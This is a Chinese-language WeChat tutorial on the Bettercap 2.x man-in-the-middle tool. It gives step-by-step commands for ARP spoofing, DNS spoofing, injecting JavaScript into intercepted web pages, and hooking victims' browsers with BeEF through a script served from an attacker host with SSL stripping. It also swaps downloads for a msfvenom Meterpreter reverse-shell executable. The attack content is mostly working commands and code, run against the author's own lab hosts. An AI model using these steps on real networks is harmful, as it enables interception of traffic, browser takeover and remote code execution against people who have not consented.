> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484066&idx=1&sn=64fa35dc067ee7f9aca7b0efbe646f64&chksm=eaad829fddda0b89fe6e493d57018747d6b248e3bfcad34c1095efff0826ba47ef7ff0ea9019&scene=21#wechat_redirect)

  

**目录  
**

  

**Bettercap**

*   安装
    
*   ARP 欺骗
    
*   DNS 欺骗
    
*   注入脚本
    
*   结合 Beef-XSS
    
*   替换下载文件
    

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReibrhokiaYKSaUiapTPiaJf6IibgTOqKkhOPn4ZlTfBs5CgNuDuiaibtjUdNXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReibrhokiaYKSaUiapTPiaJf6IibgTOqKkhOPn4ZlTfBs5CgNuDuiaibtjUdNXw/640?wx_fmt=png)

Bettercap
---------

很多人应该都听过或者用过 Ettercap，这是 Kali 下一款优秀的 ARP 欺骗的工具，可是由于它自从 2015 年开始就没有更新了。所以，即使软件再好，不更新的话，也还是不会得到使用者的青睐。我们今天要讲的就是 ettercap 的继承者 Bettercap。

Ettercap 有两个大的版本，一个是 1.X 的版本，另一个是 2.X 的版本。两个版本之间命令完全不一样，架构也重新变了。2.X 版本的采用 go 语言编写的，很多人说 2.X 版本的比 1.X 版本的难使用多了。1.X 版本的简单易使用，2.X 版本的确实有点不易使用。所以，今天我们就简单讲讲 Bettercap2.X 版本的使用

> 版本：Bettercap2.1

安装  

```
apt-get  install  bettercap
bettercap   #开启bettercap，默认是开启的eth0网卡，如果想开启其他网卡，比如无线网卡wlan0，可以bettercap iface wlan0
```

安装完之后我们就可以打开了，打开之后会列出局域网中存活的主机。最前面的 192.168.10.25 的是我们自己的主机，网段是 192.168.10.0/24

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe7qBLpxhXk3zibQPQR3mib92s0Tf2LVdia3ppSwNRaMZ0dNhg8t5vsyEAw/640?wx_fmt=png)

我们输入：help  查看 bettercap 的用法 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReqNUbU8oj9M9AUl1zwEG6Sduh0t8PTBQddsFyTENib1Fc6G75AFxHbSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe2M9JlOic2SnucwL552aia3GQPrMp6q98CGicBgP7l6ZzuuTT2qxX7dyUA/640?wx_fmt=gif)

常用参数及功能  

**下面的一些功能的解释**

*   help  模块名称    ：显示指定模块的帮助
    
*   active：    显示当前运行中的模块的信息
    
*   quit ：  结束会话并退出
    
*   sleep 秒数：    休眠指定的秒数（和 shell 中的 sleep 一样）
    
*   get 变量：    获取变量的值
    
*   set 变量  值 ：   设置变量的值（有些模块有自定义变量，比如可用 net.sniff.output 变量指定嗅探器的输出的保存路径）
    
*   read 变量 提示：    显示提示来让用户输入，输入内容会被储存在变量中
    
*   clear：    清屏
    
*   include CAPLET：    在当前会话读取并运行这个 caplet
    
*   ! 命令 ：  运行相应的 shell 命令并显示输出
    
*   alias MAC 地址 别名： 给 MAC 地址设置一个别名
    

**一些常用模块**

*   api.rest：RESTful API 模块
    
*   net.recon ：主机发现模块，用于发现局域网内存活的主机，默认是开启的
    
*   arp.spoof：arp 欺骗模块
    
*   ble.recon：低功耗蓝牙设备发现模块
    
*   net.sniff : 网络嗅探模块
    
*   dhcp6.spoof：dhcp6 欺骗模块 (通过伪造 DHCP 数据包篡改客户端的 DNS 服务器，因此需要与 dns.spoof 一并启用)
    
*   dns.spoof：DNS 欺骗模块
    
*   events.stream：串流输出模块（就是不断地在终端界面刷出程序的输出，例如 arp 截获的信息）
    
*   wifi：wifi 模块，有 deauth 攻击（wifi 杀手）和创建软 ap 的功能
    

我们可以使用 net.recon 模块的 net.show  列出局域网内存活的主机的信息

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReNfIQBygdCzbm6s5y27mlq0cmUoibRBM7nH6ndppmtVf9ic0fQh3XT3icA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe2M9JlOic2SnucwL552aia3GQPrMp6q98CGicBgP7l6ZzuuTT2qxX7dyUA/640?wx_fmt=gif)

ARP 欺骗  

我们现在用 bettercap 来进行 ARP 欺骗，先看看 arp.spoof 这个模块怎么用。输入：help  arp.spoof

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReIGT7AmCGl02dkTN68pWH1loAoEj4Err4o5k4YMQBQ6ibRauqetV6jRA/640?wx_fmt=png)

*   arp.spoof  on : 开启 ARP 欺骗
    
*   arp.ban  on ：开启 ARP 欺骗，用 ban 模式，这就意味着目标将不能上网，也就是断网攻击
    
*   arp.spoof off ：停止 ARP 欺骗 
    
*   arp.ban off :  停止 ARP 欺骗
    

**参数：**

*   arp.spoof.internal：如果为 true，那么网络中的计算机之间的本地连接将被欺骗，否则只能连接到来自外部网络 (默认为 false)
    
*   arp.spoof.targets：要欺骗的目标，可以是 ip 、mac 或者 别名 ，也可以支持 nmap 形式的 ip 区域
    
*   arp.spoof.whitelist：白名单，就是不欺骗的目标，可以是 ip、mac 或者别名
    

对于参数，我们可以 get 和 set。

```
set arp.spoof.targets  192.168.10.2,192.168.10.14   #我们设置攻击目标，用逗号分隔。分别欺骗网关(192.168.10.2)和要欺骗的主机(192.168.10.14是我另外一台主机)，这里也可以是一个网段，如：192.168.10-20
get arp.spoof.targets    #获取arp.spoof.targets的值
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRehoe7s9Wjkgicc95Ns0fFPwfiaExxicr7s7SPNsARJ3NP2aN4Hla1GIIBw/640?wx_fmt=png)

设置好了参数之后，我们就可以开启 ARP 欺骗了：arp.spoof  on 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReHRZgq9nBOfQ3hOKe9JVZJzLxvSYn74ZhYA4ZQicxibKlrYQI9TvfW79A/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe2M9JlOic2SnucwL552aia3GQPrMp6q98CGicBgP7l6ZzuuTT2qxX7dyUA/640?wx_fmt=gif)

DNS 欺骗  

dns 欺骗这里有一个前提，那就是局域网内的主机的 DNS 服务器是局域网内的网关，那样我们才能进行 DNS 欺骗，如果 DNS 服务器设置的是公网的 DNS 服务器，比如设置的谷歌的 8.8.8.8 DNS 服务器的话，这样是不能进行 DNS 欺骗的。

DNS 欺骗之前，我们先得进行 **ARP 欺骗**，就是先欺骗主机让其认为网关就是我 (攻击机)。然后由于主机的 DNS 服务器就是网关，所以主机会向我们发送 DNS 请求，这样我们就可以进行欺骗了。

```
set arp.spoof.targets 192.168.10.2,192.168.10.14
arp.spoof on    #先开启arp欺骗
set dns.spoof.domains www.baidu.com,www,taobao.com  #设置要欺骗的域名,多个域名用,分开，如果要欺骗所有的域名的话，为 *
set dns.spoof.address 3.3.3.3   #设置将要欺骗的域名转换成对应的ip地址
dns.spoof on   #开启dns欺骗，www.baidu.com和www.taobao.com对应的ip是3.3.3.3
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReNsvOTX0rpApfzp7XZI53PHVn0wNicukFWicFtahb91701LMuW8lcqSCg/640?wx_fmt=png)

可以看到，已经欺骗成功了

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReymgZeUZPAXaXhuBq2A623ia5JEUAZ9jKpt4QKBNwUOml0JX7j3LNjuA/640?wx_fmt=png)

**还有一种方法**

我们可以在打开 bettercap 的目录创建一个文件 host，文件中存放这要欺骗的域名和地址，如下

```
1.1.1.1 www.baidu.com
2.2.2.2 www.taobao.com
3.3.3.3 www.mi.com
```

然后我们进行 DNS 欺骗的时候只需要设置 arp.spoof.hosts 这个参数即可

```
#之前我们得先进行arp欺骗
set dns.spoof.hosts host  #设置dns.spoof.hosts里面存放这要欺骗的域名和欺骗后的地址，在bettercap打开的目录下
dns.spoof on  #开启dns欺骗
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReQvkyzHdv4NYJCVsIBjoibZQCzd8AhXE2DdpAceWiacdW0DDKDHJEQ9gA/640?wx_fmt=png)

很明显，已经欺骗成功了！ 

 ![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReFce09H82zS28ASicaia6aWqA8fWzLIW1JVpc4Tnl4uiaXLL8AgBOqsXkg/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe2M9JlOic2SnucwL552aia3GQPrMp6q98CGicBgP7l6ZzuuTT2qxX7dyUA/640?wx_fmt=gif)

脚本注入  

通过进行 ARP 欺骗，我们可以拦截到流量，自然，我们就可以对拦截到的流量进行操作。我们可以对包内的 http 协议的数据包进行代理，然后往里面注入恶意脚本

```
set arp.spoof.targets 192.168.10.13,192.168.10.2    #设置arp欺骗的目标
set http.proxy.script /root/1.js       #往http流量中注入脚本
set https.proxy.script /root/1.js

http.proxy on   #开启HTTP代理
https.proxy on
arp.spoof on   #开启ARP欺骗

##/root/1.js
function onResponse(req,res){
    if(res.ContentType.indexOf('text/html')==0){
        var body=res.ReadBody();
        if(body.indexOf('</head>')!=-1){
            res.Body=body.replace(
                '</head>',
               '<script type="text/javascript">alert("your computer has hacked!")</script></head>'
            );
            }
        }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReCYebg3Uiacd53lb6mQcTLtUAfT7WcFVVSE7OHia5HOic7QpVMToxTMdPA/640?wx_fmt=png)

我们用靶机访问一个 http 和 https 协议的站点，可以看到，脚本已经注入请求的网页中了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe6pnGBOvDMDhaA32tK1tW08Nh03PUwgkrsuIvxGmpnwWO89SLQR4KMQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRellUoeL5nfHDibibwVBeE03iaKciblSaK0CkTHTOFlyAG3CQUGFicHYkb72A/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe2M9JlOic2SnucwL552aia3GQPrMp6q98CGicBgP7l6ZzuuTT2qxX7dyUA/640?wx_fmt=gif)

结合 Beef-XSS  

既然我们可以注入 js 脚本文件，那么我们就可以利用 beef 来对目标浏览器进行控制

```
set arp.spoof.targets 192.168.10.13,192.168.10.2    #设置arp欺骗的目标
set http.proxy.script  /root/test.js        #往http流量中注入脚本/root/test.js
set http.proxy.sslstrip true    #启用SSL剥离

http.proxy on   #开启HTTP代理
arp.spoof on   #开启ARP欺骗



#test.js内容
function onResponse(req,res){
    if(res.ContentType.indexOf('text/html')==0){
        var body=res.ReadBody();
        if(body.indexOf('</head>')!=-1){
            res.Body=body.replace(
                '</head>',
               '<script type="text/javascript" src="http://192.168.10.27:3000/hook.js"></script></head>'
            );
            }
        }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReQC069HIib9ID66fReRobyiaZMVZrBCMdLEDnP4K5icCLvxLQSUuOia1lxg/640?wx_fmt=png)

可以看到，我们的 js 代码已经插入网页中了 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReRyf9oYjAJ9sV73qpzdeCmZibWF7p4PCXyU3ia364ZXBiaLJZSkrYeyFpQ/640?wx_fmt=png)

那我们就可以利用 beef 对目标浏览器进行很多操作了！  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRe2M9JlOic2SnucwL552aia3GQPrMp6q98CGicBgP7l6ZzuuTT2qxX7dyUA/640?wx_fmt=gif)

替换下载文件  

在 bettercap 中，有一种文件后缀叫. cap，我们启动 bettercap 的时候可以指定该. cap 文件，就会按照该. cap 文件执行命令。

我们进入 bettercap 后，可以使用命令 **caplets.update** 更新. cap 文件，然后使用命令 **caplets.show** 查看. cap 文件有哪些。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXRerc1LxMjQkRhxR0gSnNYToFMmt6BLQf5FYowQibVdcR3HNFnfadpz0cA/640?wx_fmt=png)

我们这次替换下载文件，使用的是 download-autopwn.cap 文件。我们先到该文件的目录下，因为我们要欺骗的是 windows 系统的主机，所以我们先到该目录的 windows 目录下，生成一个 payload.exe 文件，然后退回到上一个目录，执行启动命令

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.11 lport=8888 -f exe -o payload.exe
bettercap -caplet download-autopwn.cap
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cicIa2iaKFdSNIncOhLKkXReAicVWkH1L1bJlKiauFdkRR20iaUOokN34mvNltq5dztIrVo01Icicmt4rA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2ckkbwTsBvnDJpb89o8WMxvAKOaVnz60hOe7y3wAHiclddyK53lpEKIQlx4DKOq6EojHibVicgibDB2aQ/640?wx_fmt=gif)

来源：谢公子的博客

责编：浮夸

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640?wx_fmt=png)

由于文章篇幅较长，请大家耐心。如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?wx_fmt=png)